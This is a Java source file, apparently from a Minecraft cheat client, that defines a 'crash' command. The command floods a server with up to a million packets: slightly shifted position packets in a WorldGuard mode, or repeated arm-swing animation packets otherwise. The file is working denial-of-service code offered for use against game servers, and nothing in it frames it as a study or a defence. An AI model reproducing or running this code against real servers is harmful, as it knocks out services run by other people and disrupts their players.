package us.dev.direkt.command.internal.misc;

import java.util.Optional;

import net.minecraft.network.Packet;
import net.minecraft.network.play.INetHandlerPlayServer;
import net.minecraft.network.play.client.CPacketAnimation;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.network.play.client.CPacketPlayerTryUseItem;
import net.minecraft.network.play.client.CPacketPlayerTryUseItemOnBlock;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;
import us.dev.direkt.Direkt;
import us.dev.direkt.Wrapper;
import us.dev.direkt.command.Command;
import us.dev.direkt.command.handler.annotations.Executes;

/**
 * @author Foundry
 */
public class Crash extends Command {
    public Crash() {
        super(Direkt.getInstance().getCommandManager(), "crash");
    }

    @Executes
    public void run(Mode crashMode, Optional<Integer> packetCount) {
        Packet<INetHandlerPlayServer> packet; int numPackets;
        if(crashMode == Mode.WORLDGUARD || crashMode == Mode.WG) {
            for (int i = 0; i < (numPackets = packetCount.orElse(1000000)); i++) {
                Wrapper.sendPacketDirect(new CPacketPlayer.Position(Wrapper.getPlayer().posX, Wrapper.getPlayer().posY  + (i * 0.00001), Wrapper.getPlayer().posZ, Wrapper.getPlayer().onGround));
            }
        }
        else {
        packet = new CPacketAnimation(EnumHand.MAIN_HAND);
        for (int i = 0; i < (numPackets = packetCount.orElse(1000000)); i++) {
            Wrapper.sendPacketDirect(packet);
        }
       
    }
   }
    private enum Mode {
        FIST("Fist"), HAND("Hand"),
        WORLDGUARD("WorldGuard"),
        WG("WG");

        final String name;
        Mode(String name) {
            this.name = name;
        }

        @Override
        public String toString() {
            return name;
        }
    }
}
